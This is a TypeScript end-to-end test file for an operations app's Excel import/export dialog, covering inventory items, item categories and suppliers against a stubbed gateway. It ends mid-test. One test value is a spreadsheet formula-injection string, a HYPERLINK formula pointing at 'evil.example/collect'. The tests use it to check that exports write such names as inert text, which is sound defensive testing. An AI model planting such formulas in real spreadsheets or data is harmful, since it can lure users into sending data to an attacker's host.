/**
 * The Operations import and export end to end, with nothing stood in for: the real
 * `useImportExport` from `@opsgrids/client`, the real `ImportExportButton` dialog from
 * `@opsgrids/ui`, the real api client, and a stubbed gateway (`fetch`) that serves the lookups,
 * answers every create, and records what it was sent. Workbooks are built in memory with exceljs
 * and handed over the way a person hands a file to the dialog; the files the engine downloads are
 * read back with exceljs. The runner spaces its requests by 350 ms, so each import takes a couple
 * of seconds of real time.
 */
import * as ExcelJS from "exceljs";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";

import type { ImportSummary, SheetValue } from "@opsgrids/client";

import type { InventoryItemOut } from "@/api/types";
import { Harness } from "./DialogHarness";
import {
  XLSX_MIME,
  fileWithoutColumn,
  formulaCells,
  headerRow,
  installBrowserGaps,
  jsonBody,
  openDialog,
  readDownload,
  rowContaining,
  sheetOf,
  stat,
  uploadFile,
  workbookFile,
} from "./dialogTestKit";
import { itemCategoryOut, pageAt, requestsTo, stubGateway, uomOut, warehouseOut } from "./entityTestKit";
import type { RecordedRequest } from "./entityTestKit";
import { inventoryImport } from "./inventory";
import type { InventoryFilters } from "./inventory";
import { itemCategoryImport } from "./itemCategories";
import { supplierImport } from "./suppliers";

const downloads = installBrowserGaps();

const API = "/api/v1/operations";
const TEST_TIMEOUT = 10_000;
const SLOW = { timeout: 8_000 };

beforeEach(() => {
  downloads.length = 0;
});

afterEach(() => {
  vi.unstubAllGlobals();
});

/* ------------------------------ what the gateway holds ------------------------------ */

/** Two pages, so a lookup that read only the first would call a real warehouse unknown. */
const WAREHOUSE_PAGES = [[warehouseOut("Main Warehouse", "WH-MAIN")], [warehouseOut("Cold Store", "WH-COLD")]];
const UNIT_PAGES = [[uomOut("pcs", "Piece", true), uomOut("kg", "Kilogram", true), uomOut("l", "Litre", true)]];
const CATEGORY_PAGES = [
  [itemCategoryOut("METALS", "cat-metals")],
  [itemCategoryOut("STEEL", "cat-steel", "cat-metals")],
];

/** A 409 as the server sends it: the sentence, and where it says so, the field that repeats. */
function conflict(detail: string, duplicateField?: string) {
  const errors = duplicateField === undefined ? [] : [{ field: duplicateField, code: "duplicate", message: detail }];
  return {
    status: 409,
    body: { type: "conflict", title: "Conflict", status: 409, detail, ...(errors.length > 0 ? { errors } : {}) },
  };
}

function pagesAsked(recorded: readonly RecordedRequest[], path: string): (string | null)[] {
  return requestsTo(recorded, "GET", path).map((request) => request.url.searchParams.get("page"));
}

/* ------------------------------ inventory items ------------------------------ */

interface InventoryOptions {
  /** The pages of `GET /inventory`, which an export walks. */
  listPages?: readonly (readonly InventoryItemOut[])[];
}

function inventoryGateway({ listPages = [] }: InventoryOptions = {}): RecordedRequest[] {
  return stubGateway(({ url, init }) => {
    const page = Number(url.searchParams.get("page") ?? "1");
    switch (`${init.method ?? "GET"} ${url.pathname}`) {
      case `GET ${API}/warehouses`:
        return { body: pageAt(WAREHOUSE_PAGES, page) };
      case `GET ${API}/inventory/uoms`:
        return { body: pageAt(UNIT_PAGES, page) };
      case `GET ${API}/inventory/categories`:
        return { body: pageAt(CATEGORY_PAGES, page) };
      case `GET ${API}/inventory`:
        return { body: pageAt(listPages, page) };
      case `POST ${API}/inventory`: {
        const { sku } = jsonBody(init);
        if (sku === "DUP-0001") return conflict("An inventory item with SKU 'DUP-0001' already exists");
        if (sku === "BAD-0422") {
          return {
            status: 422,
            body: {
              type: "validation",
              title: "Validation failed",
              status: 422,
              detail: "Request payload failed validation",
              errors: [{ field: "name", code: "string_too_short", message: "String should have at least 3 characters" }],
            },
          };
        }
        return { status: 201, body: { id: `item-${String(sku)}` } };
      }
      default:
        throw new Error(`The gateway was not expecting ${init.method ?? "GET"} ${url.pathname}`);
    }
  });
}

const INVENTORY_COLUMNS = inventoryImport.columns.filter((column) => column.readOnly !== true);
/** The header row of the sample sheet: required columns carry the asterisk. */
const INVENTORY_HEADERS = INVENTORY_COLUMNS.map((column) =>
  column.required === true ? `${column.header} *` : column.header,
);

/** One sheet row, in the order of the header row; a column the row does not mention is blank. */
function inventoryRow(values: Record<string, ExcelJS.CellValue>): ExcelJS.CellValue[] {
  return INVENTORY_COLUMNS.map((column) => values[column.key] ?? null);
}

/** A sample row left in the file exactly as the sample sheet wrote it (money as a number). */
function untouchedSample(sample: Record<string, SheetValue>): ExcelJS.CellValue[] {
  return INVENTORY_COLUMNS.map((column) => {
    const value = sample[column.key] ?? null;
    return column.kind === "money" && typeof value === "string" ? Number(value) : value;
  });
}

function firstSample(): Record<string, SheetValue> {
  const [first] = inventoryImport.sampleRows;
  if (first === undefined) throw new Error("inventory has no sample rows");
  return first;
}

/** Rows 2 to 9 of the file: five the server will be asked about, two that never leave the browser
 *  and the unchanged example. */
async function inventoryFile(): Promise<File> {
  return workbookFile("stock-take.xlsx", INVENTORY_HEADERS, [
    // Row 2: money as a number, the warehouse in the wrong case, HSN with its leading zero, TRUE.
    inventoryRow({
      sku: "RM-STL-9001",
      name: "Cold-rolled steel coil, 1.5 mm",
      category: "Raw materials",
      warehouse: "main warehouse",
      uom: "kg",
      reorder_point: 4000,
      unit_value: 62.4,
      currency: "INR",
      opening_stock: 8200,
      item_category: "steel",
      hsn_code: "0721",
      track_lot: true,
    }),
    // Row 3: a three-decimal currency, the amount typed as text, "No" for a yes/no cell.
    inventoryRow({
      sku: "IMP-KWD-01",
      name: "Imported gear oil",
      category: "MRO",
      warehouse: "Cold Store",
      uom: "l",
      unit_value: "1.250",
      currency: "kwd",
      is_active: "No",
    }),
    // Row 4: a currency with no decimals, an opening stock of zero, an 8-digit HSN that starts with 0.
    inventoryRow({
      sku: "IMP-JPY-01",
      name: "Imported fastener kit",
      category: "Components",
      warehouse: "Main Warehouse",
      uom: "pcs",
      unit_value: 5000,
      currency: "JPY",
      opening_stock: 0,
      hsn_code: "01012100",
    }),
    // Row 5: the server already has this SKU.
    inventoryRow({
      sku: "DUP-0001",
      name: "Already in the system",
      category: "Packaging",
      warehouse: "Main Warehouse",
      uom: "pcs",
    }),
    // Row 6: passes every check here, and the server refuses it.
    inventoryRow({
      sku: "BAD-0422",
      name: "Ab",
      category: "Services",
      warehouse: "Cold Store",
      uom: "pcs",
    }),
    // Row 7: a warehouse the organisation does not have.
    inventoryRow({
      sku: "NOW-0001",
      name: "Stocked nowhere",
      category: "Raw materials",
      warehouse: "Atlantis Depot",
      uom: "kg",
    }),
    // Row 8: a unit of measure the organisation does not have.
    inventoryRow({
      sku: "UOM-0001",
      name: "Counted in furlongs",
      category: "Raw materials",
      warehouse: "Main Warehouse",
      uom: "furlongs",
    }),
    // Row 9: a sheet from Tally, which counts in "Nos" (the server folds it onto pcs).
    inventoryRow({
      sku: "TAL-0001",
      name: "Hex bolt, M8",
      category: "Components",
      warehouse: "Cold Store",
      uom: "Nos",
      reorder_point: 500,
    }),
    // Row 10: a reorder point the API's 32-bit column cannot take once multiplied by 1000.
    inventoryRow({
      sku: "BIG-0001",
      name: "Reorder point out of range",
      category: "Components",
      warehouse: "Main Warehouse",
      uom: "pcs",
      reorder_point: 3_000_000,
    }),
    // Row 11: the first example from the sample sheet, unchanged.
    untouchedSample(firstSample()),
  ]);
}

describe("importing inventory items through the real dialog", () => {
  it(
    "previews the file, sends each valid row as the API wants it, and reports every outcome",
    async () => {
      const user = userEvent.setup();
      const onImported = vi.fn<(summary: ImportSummary) => void>();
      const recorded = inventoryGateway();
      render(<Harness entity={inventoryImport} onImported={onImported} />);

      await openDialog(user, "inventory items");
      await uploadFile(user, await inventoryFile());

      // The preview: counts, then the reason each refused row will not be sent.
      const review = await screen.findByRole("dialog", { name: "Review your file" }, SLOW);
      expect(within(review).getByText("stock-take.xlsx")).toBeTruthy();
      expect(stat(review, "Rows in file")).toBe("10");
      expect(stat(review, "Ready to import")).toBe("6");
      expect(stat(review, "Need fixing")).toBe("3");
      expect(stat(review, "Sample rows skipped")).toBe("1");
      expect(within(review).queryByText(/These columns are ignored/)).toBeNull();

      const preview = within(review).getByRole("table", { name: "Rows found in stock-take.xlsx" });
      const unknownWarehouse = rowContaining(preview, "NOW-0001").textContent ?? "";
      expect(unknownWarehouse).toContain("Needs fixing");
      // The engine's sentence, then the column's own hint on how to put it right.
      expect(unknownWarehouse).toContain(
        "'Atlantis Depot' is not one of the accepted values for Warehouse (see the Lists sheet). " +
          "Warehouses must exist already and are matched by name, ignoring capitals.",
      );
      const unknownUnit = rowContaining(preview, "UOM-0001").textContent ?? "";
      expect(unknownUnit).toContain("Needs fixing");
      expect(unknownUnit).toContain(
        "'furlongs' is not one of the accepted values for Unit of measure (see the Lists sheet). " +
          "Only units that already exist can be used, so a misspelling cannot create a new one. See the Lists sheet.",
      );
      const tooMany = rowContaining(preview, "BIG-0001").textContent ?? "";
      expect(tooMany).toContain("Needs fixing");
      expect(tooMany).toContain("Reorder point must be between 0 and 2147483");
      expect(rowContaining(preview, "RM-STL-4501").textContent).toContain("Sample");
      expect(rowContaining(preview, "RM-STL-9001").textContent).toContain("New");
      expect(rowContaining(preview, "TAL-0001").textContent).toContain("New");

      // Every page of every lookup was read: the second warehouse and category live on page 2.
      expect(pagesAsked(recorded, `${API}/warehouses`)).toEqual(["1", "2"]);
      expect(pagesAsked(recorded, `${API}/inventory/uoms`)).toEqual(["1"]);
      expect(pagesAsked(recorded, `${API}/inventory/categories`)).toEqual(["1", "2"]);
      expect(requestsTo(recorded, "POST", `${API}/inventory`)).toHaveLength(0);

      await user.click(within(review).getByRole("button", { name: "Import 6 rows" }));

      const finished = await screen.findByRole("dialog", { name: "Import finished" }, SLOW);

      // (a) Exactly what was sent, in sheet order, with names resolved and money in minor units.
      const posts = requestsTo(recorded, "POST", `${API}/inventory`);
      expect(posts.map((request) => jsonBody(request.init))).toEqual([
        {
          sku: "RM-STL-9001",
          name: "Cold-rolled steel coil, 1.5 mm",
          category: "raw_materials",
          warehouse: "Main Warehouse",
          uom: "kg",
          reorder_point: 4000,
          unit_value_minor: 6240,
          currency: "INR",
          opening_on_hand: 8200,
          item_category_id: "cat-steel",
          hsn_code: "0721",
          track_lot: true,
        },
        {
          sku: "IMP-KWD-01",
          name: "Imported gear oil",
          category: "mro",
          warehouse: "Cold Store",
          uom: "l",
          unit_value_minor: 1250,
          currency: "KWD",
          is_active: false,
        },
        {
          sku: "IMP-JPY-01",
          name: "Imported fastener kit",
          category: "components",
          warehouse: "Main Warehouse",
          uom: "pcs",
          unit_value_minor: 5000,
          currency: "JPY",
          opening_on_hand: 0,
          hsn_code: "01012100",
        },
        // A blank currency cell is filled with the engine's default (INR, which is also the API's).
        {
          sku: "DUP-0001",
          name: "Already in the system",
          category: "packaging",
          warehouse: "Main Warehouse",
          uom: "pcs",
          currency: "INR",
        },
        {
          sku: "BAD-0422",
          name: "Ab",
          category: "services",
          warehouse: "Cold Store",
          uom: "pcs",
          currency: "INR",
        },
        // "Nos" went over as the unit the server folds it onto, not as a spelling it might not fold.
        {
          sku: "TAL-0001",
          name: "Hex bolt, M8",
          category: "components",
          warehouse: "Cold Store",
          uom: "pcs",
          reorder_point: 500,
          currency: "INR",
        },
      ]);
      expect(posts.every((request) => request.init.method === "POST")).toBe(true);
      // The HSN went over as the text it is, not as a number that lost its zero.
      expect(String(posts[0]?.init.body)).toContain('"hsn_code":"0721"');

      // (b) The counts and the server's own sentences.
      expect(stat(finished, "Created")).toBe("4");
      expect(stat(finished, "Skipped, already exist")).toBe("1");
      expect(stat(finished, "Failed")).toBe("1");
      expect(stat(finished, "Invalid")).toBe("3");
      expect(within(finished).getByText("4 rows failed; 1 row already existed and was skipped. 4 inventory items were created.")).toBeTruthy();

      const problems = within(finished).getByRole("table", { name: "Rows that were not created" });
      expect(within(problems).getAllByRole("row")).toHaveLength(1 + 5);
      const skipped = rowContaining(problems, "DUP-0001").textContent ?? "";
      expect(skipped).toMatch(/skipped/i);
      expect(skipped).toContain("An inventory item with SKU 'DUP-0001' already exists");
      const failed = rowContaining(problems, "BAD-0422").textContent ?? "";
      expect(failed).toMatch(/failed/i);
      expect(failed).toContain("Request payload failed validation (name: String should have at least 3 characters)");
      expect(rowContaining(problems, "NOW-0001").textContent).toContain("Atlantis Depot");
      expect(rowContaining(problems, "UOM-0001").textContent).toContain("furlongs");
      expect(rowContaining(problems, "BIG-0001").textContent).toContain("Reorder point must be between 0 and 2147483");
      expect(within(problems).queryByText("RM-STL-9001")).toBeNull();
      expect(within(problems).queryByText("TAL-0001")).toBeNull();

      // (c) The screen is told once, with the run's summary, so it reloads its list.
      await waitFor(() => expect(onImported).toHaveBeenCalledTimes(1));
      expect(onImported).toHaveBeenCalledWith(
        expect.objectContaining({ created: 4, skipped: 1, failed: 1, invalid: 3, cancelled: false }),
      );

      await user.click(within(finished).getByRole("button", { name: "Done" }));
      expect(screen.queryByRole("dialog")).toBeNull();
      expect(onImported).toHaveBeenCalledTimes(1);
      expect(requestsTo(recorded, "POST", `${API}/inventory`)).toHaveLength(6);
    },
    TEST_TIMEOUT,
  );
});

/* ------------------------------ inventory export ------------------------------ */

function inventoryItem(overrides: Partial<InventoryItemOut>): InventoryItemOut {
  return {
    id: "item-1",
    sku: "RM-STL-4501",
    name: "Cold-rolled steel coil",
    category: "raw_materials",
    warehouse: "Main Warehouse",
    on_hand: 82,
    on_hand_qty: "82.5",
    reserved_qty: "2.25",
    available_qty: "80.25",
    reorder_point: 40,
    uom: "kg",
    unit_value_minor: 6240,
    currency: "INR",
    updated_at: "2026-09-25T09:30:00Z",
    item_category_id: "cat-steel",
    secondary_uom_id: null,
    hsn_code: "0721",
    track_lot: true,
    track_roll: false,
    track_expiry: false,
    track_quality: false,
    receipt_tolerance_pct: "0",
    is_active: true,
    selling_price_minor: null,
    selling_price_currency: null,
    ...overrides,
  };
}

const FORMULA_NAME = '=HYPERLINK("http://evil.example/collect","Click here")';

const EXPORT_PAGES = [
  [inventoryItem({})],
  [
    inventoryItem({
      id: "item-2",
      sku: "IMP-KWD-01",
      name: FORMULA_NAME,
      category: "mro",
      warehouse: "Cold Store",
      on_hand: 1_234_567,
      on_hand_qty: "1234567.125",
      reserved_qty: "0",
      available_qty: "1234567.125",
      reorder_point: 0,
      // Stored as it was typed on the sheet it came from; the server folded it onto litres.
      uom: "Ltr",
      unit_value_minor: 1250,
      currency: "KWD",
      item_category_id: null,
      hsn_code: "",
      is_active: false,
    }),
  ],
];

/** What Stock on Hand has on screen when the person opens the dialog. */
const SCREEN_FILTERS: InventoryFilters = {
  q: "steel",
  warehouse: "Main Warehouse",
  item_category_id: "all",
  sort: "value",
  low_stock: true,
};

/** The row of an exported sheet as `{header: value}`. */
function exportedRow(sheet: ExcelJS.Worksheet, rowNumber: number): Record<string, ExcelJS.CellValue> {
  const headers = headerRow(sheet);
  const row = sheet.getRow(rowNumber);
  return Object.fromEntries(headers.map((header, index) => [header, row.getCell(index + 1).value]));
}

describe("exporting inventory items through the real dialog", () => {
  it(
    "walks the whole filtered list and writes a workbook a person can edit and import again",
    async () => {
      const user = userEvent.setup();
      const recorded = inventoryGateway({ listPages: EXPORT_PAGES });
      render(<Harness entity={inventoryImport} filters={SCREEN_FILTERS} />);

      const dialog = await openDialog(user, "inventory items");
      await user.click(within(dialog).getByRole("button", { name: /Export to Excel/ }));
      await waitFor(() => expect(downloads).toHaveLength(1), SLOW);

      // (d) The list endpoint was asked for every page, under the screen's filters, 200 at a time.
      const list = requestsTo(recorded, "GET", `${API}/inventory`);
      expect(list.map((request) => Object.fromEntries(request.url.searchParams))).toEqual([
        { page: "1", size: "200", q: "steel", warehouse: "Main Warehouse", low_stock: "true", sort: "value" },
        { page: "2", size: "200", q: "steel", warehouse: "Main Warehouse", low_stock: "true", sort: "value" },
      ]);
      expect(requestsTo(recorded, "POST", `${API}/inventory`)).toHaveLength(0);

      const [download] = downloads;
      expect(download?.fileName).toMatch(/^inventory-items-\d{4}-\d{2}-\d{2}\.xlsx$/);
      if (download === undefined) throw new Error("nothing was downloaded");
      const workbook = await readDownload(download);
      expect(workbook.worksheets.map((sheet) => sheet.name)).toEqual(["Export", "OpsGrids baseline"]);
      const sheet = sheetOf(workbook, "Export");

      // The columns are the importable ones and the read-only ones; opening stock, which the list
      // never returns, is not there to be an empty column.
      expect(headerRow(sheet)).toEqual([
        "SKU",
        "Item name",
        "Category",
        "Warehouse",
        "Unit of measure",
        "Reorder point",
        "Unit value",
        "Currency",
        "Item category code",
        "HSN code",
        "Track lots",
        "Track rolls",
        "Track expiry",
        "Track quality",
        "Active",
        "On hand",
        "Reserved",
        "Available",
        "Last updated",
        "Record ID",
      ]);
      expect(headerRow(sheet)).not.toContain("Opening stock");
      expect(sheet.rowCount).toBe(3);

      expect(exportedRow(sheet, 2)).toEqual({
        SKU: "RM-STL-4501",
        "Item name": "Cold-rolled steel coil",
        Category: "Raw materials",
        Warehouse: "Main Warehouse",
        "Unit of measure": "kg",
        "Reorder point": 40,
        "Unit value": 62.4,
        Currency: "INR",
        "Item category code": "STEEL",
        "HSN code": "0721",
        "Track lots": "Yes",
        "Track rolls": "No",
        "Track expiry": "No",
        "Track quality": "No",
        Active: "Yes",
        "On hand": 82.5,
        Reserved: 2.25,
        Available: 80.25,
        "Last updated": "2026-09-25T09:30:00Z",
        "Record ID": "item-1",
      });
      expect(exportedRow(sheet, 3)).toMatchObject({
        SKU: "IMP-KWD-01",
        // The canonical label of the unit, not the spelling the item was stored with.
        "Unit of measure": "l",
        "Unit value": 1.25,
        Currency: "KWD",
        "Item category code": null,
        "HSN code": null,
        Active: "No",
        "On hand": 1234567.125,
        Reserved: 0,
        Available: 1234567.125,
      });

      // Text stays text and money keeps its currency's decimals.
      expect(sheet.getCell("J2").value).toBe("0721");
      expect(sheet.getCell("J2").type).toBe(ExcelJS.ValueType.String);
      expect(sheet.getCell("G2").numFmt).toBe("#,##0.00");
      expect(sheet.getCell("G3").numFmt).toBe("#,##0.000");

      // A name that starts like a formula is written as the text it is, and nothing is a formula.
      expect(sheet.getCell("B3").value).toBe(FORMULA_NAME);
      expect(sheet.getCell("B3").type).toBe(ExcelJS.ValueType.String);
      expect(formulaCells(workbook)).toEqual([]);

      // Quantities are exact decimal strings in the API. The engine writes a decimal column as a
      // number cell, and a quantity of up to 15 significant digits reads back as the very same text.
      const [first, second] = [exportedRow(sheet, 2), exportedRow(sheet, 3)];
      expect([first["On hand"], first.Reserved, first.Available].map(String)).toEqual(["82.5", "2.25", "80.25"]);
      expect([second["On hand"], second.Reserved, second.Available].map(String)).toEqual([
        "1234567.125",
        "0",
        "1234567.125",
      ]);

      // The export left the dialog on its menu, ready for the next action.
      expect(within(dialog).getByRole("button", { name: /Export to Excel/ })).toBeTruthy();
    },
    TEST_TIMEOUT,
  );

  it(
    "refuses an export uploaded again untouched, row by row, and sends nothing",
    async () => {
      const user = userEvent.setup();
      const recorded = inventoryGateway({ listPages: EXPORT_PAGES });
      render(<Harness entity={inventoryImport} filters={SCREEN_FILTERS} />);

      const dialog = await openDialog(user, "inventory items");
      await user.click(within(dialog).getByRole("button", { name: /Export to Excel/ }));
      await waitFor(() => expect(downloads).toHaveLength(1), SLOW);
      const [download] = downloads;
      if (download === undefined) throw new Error("nothing was downloaded");

      await uploadFile(user, new File([download.blob], download.fileName, { type: XLSX_MIME }));
      const review = await screen.findByRole("dialog", { name: "Review your file" }, SLOW);

      expect(stat(review, "Rows in file")).toBe("2");
      expect(stat(review, "Ready to import")).toBe("0");
      expect(stat(review, "Need fixing")).toBe("2");
      const preview = within(review).getByRole("table", { name: `Rows found in ${download.fileName}` });
      for (const sku of ["RM-STL-4501", "IMP-KWD-01"]) {
        expect(rowContaining(preview, sku).textContent).toContain(
          "This row has a Record ID, so it came from an export and is already in the system. " +
            "Clear the Record ID cell to add it as a new record. " +
            "Switch to Add new and update existing to update it.",
        );
      }
      expect(within(review).getByRole("button", { name: "Import 0 rows" }).hasAttribute("disabled")).toBe(true);
      expect(requestsTo(recorded, "POST", `${API}/inventory`)).toHaveLength(0);
    },
    TEST_TIMEOUT,
  );

  it(
    "gives back rows that import again as the same items once their ID is left behind",
    async () => {
      const user = userEvent.setup();
      const recorded = inventoryGateway({ listPages: EXPORT_PAGES });
      render(<Harness entity={inventoryImport} filters={SCREEN_FILTERS} />);

      const dialog = await openDialog(user, "inventory items");
      await user.click(within(dialog).getByRole("button", { name: /Export to Excel/ }));
      await waitFor(() => expect(downloads).toHaveLength(1), SLOW);
      const [download] = downloads;
      if (download === undefined) throw new Error("nothing was downloaded");

      // The ID marks a row as one that came out of the system; without it these are new rows.
      await uploadFile(user, await fileWithoutColumn(download, "Export", "Record ID"));
      const review = await screen.findByRole("dialog", { name: "Review your file" }, SLOW);
      expect(stat(review, "Rows in file")).toBe("2");
      expect(stat(review, "Ready to import")).toBe("2");
      expect(stat(review, "Need fixing")).toBe("0");
      expect(stat(review, "Sample rows skipped")).toBe("0");
      // On hand, Reserved, Available and Last updated are read-only: recognised, not "unknown".
      expect(within(review).queryByText(/These columns are ignored/)).toBeNull();

      await user.click(within(review).getByRole("button", { name: "Import 2 rows" }));
      await screen.findByRole("dialog", { name: "Import finished" }, SLOW);

      // Each item comes back as the record it was: names resolved again, money back in minor units,
      // the HSN still a string with its zero, and a name that looks like a formula still text.
      expect(
        requestsTo(recorded, "POST", `${API}/inventory`).map((request) => jsonBody(request.init)),
      ).toEqual([
        {
          sku: "RM-STL-4501",
          name: "Cold-rolled steel coil",
          category: "raw_materials",
          warehouse: "Main Warehouse",
          uom: "kg",
          reorder_point: 40,
          unit_value_minor: 6240,
          currency: "INR",
          item_category_id: "cat-steel",
          hsn_code: "0721",
          track_lot: true,
          track_roll: false,
          track_expiry: false,
          track_quality: false,
          is_active: true,
        },
        {
          sku: "IMP-KWD-01",
          name: FORMULA_NAME,
          category: "mro",
          warehouse: "Cold Store",
          uom: "l",
          reorder_point: 0,
          unit_value_minor: 1250,
          currency: "KWD",
          track_lot: true,
          track_roll: false,
          track_expiry: false,
          track_quality: false,
          is_active: false,
        },
      ]);
    },
    TEST_TIMEOUT,
  );
});

/* ------------------------------ item categories ------------------------------ */

function categoryGateway(): RecordedRequest[] {
  return stubGateway(({ url, init }) => {
    const page = Number(url.searchParams.get("page") ?? "1");
    switch (`${init.method ?? "GET"} ${url.pathname}`) {
      case `GET ${API}/inventory/categories`:
        return { body: pageAt(CATEGORY_PAGES, page) };
      case `POST ${API}/inventory/categories`: {
        const { code } = jsonBody(init);
        if (code === "STEEL") return conflict("A category coded 'STEEL' already exists", "code");
        return { status: 201, body: { id: `cat-${String(code)}` } };
      }
      default:
        throw new Error(`The gateway was not expecting ${init.method ?? "GET"} ${url.pathname}`);
    }
  });
}

const CATEGORY_HEADERS = ["Category code *", "Category name *", "Parent category code", "Record ID"];

describe("importing item categories through the real dialog", () => {
  it(
    "resolves a parent by its code, skips a duplicate, and refuses an unknown parent and a code that only differs in capitals",
    async () => {
      const user = userEvent.setup();
      const onImported = vi.fn<(summary: ImportSummary) => void>();
      const recorded = categoryGateway();
      render(<Harness entity={itemCategoryImport} onImported={onImported} />);

      await openDialog(user, "item categories");
      await uploadFile(
        user,
        await workbookFile("categories.xlsx", CATEGORY_HEADERS, [
          // The layout of an export, with the ID column left empty for rows that are new.
          ["ALLOYS", "Alloys", null, null],
          ["STAINLESS", "Stainless steel", "steel", null],
          ["STEEL", "Steel", null, null],
          ["PVC", "Polyvinyl chloride", "PLASTICS", null],
          ["metals", "Metals, again", null, null],
          ["POLYMERS", "Polymers", null, null],
        ]),
      );

      const review = await screen.findByRole("dialog", { name: "Review your file" }, SLOW);
      expect(stat(review, "Rows in file")).toBe("6");
      expect(stat(review, "Ready to import")).toBe("3");
      expect(stat(review, "Need fixing")).toBe("2");
      expect(stat(review, "Sample rows skipped")).toBe("1");
      expect(within(review).queryByText(/These columns are ignored/)).toBeNull();
      const preview = within(review).getByRole("table", { name: "Rows found in categories.xlsx" });
      expect(rowContaining(preview, "PVC").textContent).toContain(
        "'PLASTICS' is not one of the accepted values for Parent category code (see the Lists sheet). " +
          "Import the parent first, then run this file again: rows already imported are skipped.",
      );
      // METALS exists; the server would take "metals" beside it and no sheet could name either again.
      expect(rowContaining(preview, "Metals, again").textContent).toContain(
        "An item category with the code 'METALS' already exists; codes that differ only in capitals are not accepted.",
      );
      expect(pagesAsked(recorded, `${API}/inventory/categories`)).toEqual(["1", "2"]);

      await user.click(within(review).getByRole("button", { name: "Import 3 rows" }));
      const finished = await screen.findByRole("dialog", { name: "Import finished" }, SLOW);

      expect(
        requestsTo(recorded, "POST", `${API}/inventory/categories`).map((request) => jsonBody(request.init)),
      ).toEqual([
        { code: "ALLOYS", name: "Alloys" },
        { code: "STAINLESS", name: "Stainless steel", parent_id: "cat-steel" },
        { code: "STEEL", name: "Steel" },
      ]);

      expect(stat(finished, "Created")).toBe("2");
      expect(stat(finished, "Skipped, already exist")).toBe("1");
      expect(stat(finished, "Failed")).toBe("0");
      expect(stat(finished, "Invalid")).toBe("2");
      expect(within(finished).getByText("2 rows failed; 1 row already existed and was skipped. 2 item categories were created.")).toBeTruthy();
      const problems = within(finished).getByRole("table", { name: "Rows that were not created" });
      expect(rowContaining(problems, "STEEL").textContent).toContain("A category coded 'STEEL' already exists");

      await waitFor(() => expect(onImported).toHaveBeenCalledTimes(1));
      expect(onImported).toHaveBeenCalledWith(
        expect.objectContaining({ created: 2, skipped: 1, failed: 0, invalid: 2, cancelled: false }),
      );
    },
    TEST_TIMEOUT,
  );

  it("does not tell the screen to reload when nothing was created", async () => {
    const user = userEvent.setup();
    const onImported = vi.fn<(summary: ImportSummary) => void>();
    categoryGateway();
    render(<Harness entity={itemCategoryImport} onImported={onImported} />);

    await openDialog(user, "item categories");
    await uploadFile(user, await workbookFile("categories.xlsx", CATEGORY_HEADERS, [["STEEL", "Steel", null, null]]));
    const review = await screen.findByRole("dialog", { name: "Review your file" }, SLOW);
    await user.click(within(review).getByRole("button", { name: "Import 1 row" }));
    const finished = await screen.findByRole("dialog", { name: "Import finished" }, SLOW);

    expect(
      within(finished).getByText("Nothing new to import. Every row already exists, so nothing was overwritten."),
    ).toBeTruthy();
    expect(onImported).not.toHaveBeenCalled();
  }, TEST_TIMEOUT);
});

describe("exporting item categories through the real dialog", () => {
  it("writes each parent as the code an import would accept, from the unfiltered list", async () => {
    const user = userEvent.setup();
    const recorded = categoryGateway();
    render(<Harness entity={itemCategoryImport} />);

    const dialog = await openDialog(user, "item categories");
    await user.click(within(dialog).getByRole("button", { name: /Export to Excel/ }));
    await waitFor(() => expect(downloads).toHaveLength(1), SLOW);

    // Once for the lookups and once for the export itself: the same pages, no filters.
    for (const request of requestsTo(recorded, "GET", `${API}/inventory/categories`)) {
      expect([...request.url.searchParams.keys()].sort()).toEqual(["page", "size"]);
      expect(request.url.searchParams.get("size")).toBe("200");
    }
    expect(pagesAsked(recorded, `${API}/inventory/categories`)).toEqual(["1", "2", "1", "2"]);

    const [download] = downloads;
    if (download === undefined) throw new Error("nothing was downloaded");
    expect(download.fileName).toMatch(/^item-categories-\d{4}-\d{2}-\d{2}\.xlsx$/);
    const workbook = await readDownload(download);
    const sheet = sheetOf(workbook, "Export");
    expect(headerRow(sheet)).toEqual(["Category code", "Category name", "Parent category code", "Record ID"]);
    expect(exportedRow(sheet, 2)).toEqual({
      "Category code": "METALS",
      "Category name": "METALS",
      "Parent category code": null,
      "Record ID": "cat-metals",
    });
    expect(exportedRow(sheet, 3)).toEqual({
      "Category code": "STEEL",
      "Category name": "STEEL",
      "Parent category code": "METALS",
      "Record ID": "cat-steel",
    });
    expect(formulaCells(workbook)).toEqual([]);
  }, TEST_TIMEOUT);
});

/* ------------------------------ suppliers ------------------------------ */

function supplierGateway(): RecordedRequest[] {
  return stubGateway(({ init, url }) => {
    if (`${init.method ?? "GET"} ${url.pathname}` !== `POST ${API}/suppliers`) {
      throw new Error(`The gateway was not expecting ${init.method ?? "GET"} ${url.pathname}`);
    }
    const { code } = jsonBody(init);
    if (code === "SUP-DUP") return conflict(`A supplier coded '${code}' already exists`, "code");
    // A conflict that is not "this exists already": the row was refused, not skipped.
    if (code === "SUP-LOCK") return conflict("The supplier directory is closed while month-end runs");
    return { status: 201, body: { id: `sup-${String(code)}` } };
  });
}

describe("importing suppliers through the real dialog", () => {
  it(
    "keeps an email's local part as typed, refuses a date where Excel turned a code into one, and tells a duplicate from another conflict",
    async () => {
      const user = userEvent.setup();
      const onImported = vi.fn<(summary: ImportSummary) => void>();
      const recorded = supplierGateway();
      render(<Harness entity={supplierImport} onImported={onImported} />);

      await openDialog(user, "suppliers");
      await uploadFile(
        user,
        await workbookFile(
          "suppliers.xlsx",
          ["Supplier code *", "Supplier name *", "Category *", "Status", "Lead time (days)", "Contact email", "Supplier since"],
          [
            [
              "SUP-NEW1",
              "Northern Steel",
              "Raw materials",
              "On hold",
              14,
              "Rajesh.Pillai@Meridian.Example",
              new Date(Date.UTC(2024, 2, 4)),
            ],
            // A code such as 1-10 typed into a General cell: Excel stores 10 January.
            [new Date(Date.UTC(2026, 0, 10)), "Ten-one", "MRO", null, null, null, null],
            ["SUP-DUP", "Already there", "Packaging", null, null, null, null],
            ["SUP-LOCK", "Refused, not a duplicate", "Logistics", null, null, null, null],
          ],
        ),
      );

      const review = await screen.findByRole("dialog", { name: "Review your file" }, SLOW);
      expect(stat(review, "Rows in file")).toBe("4");
      expect(stat(review, "Ready to import")).toBe("3");
      expect(stat(review, "Need fixing")).toBe("1");
      const preview = within(review).getByRole("table", { name: "Rows found in suppliers.xlsx" });
      expect(rowContaining(preview, "Ten-one").textContent).toContain(
        "Supplier code was turned into a date by Excel (for example 1-10 becomes 10 January). " +
          "Format the column as Text and type it again.",
      );

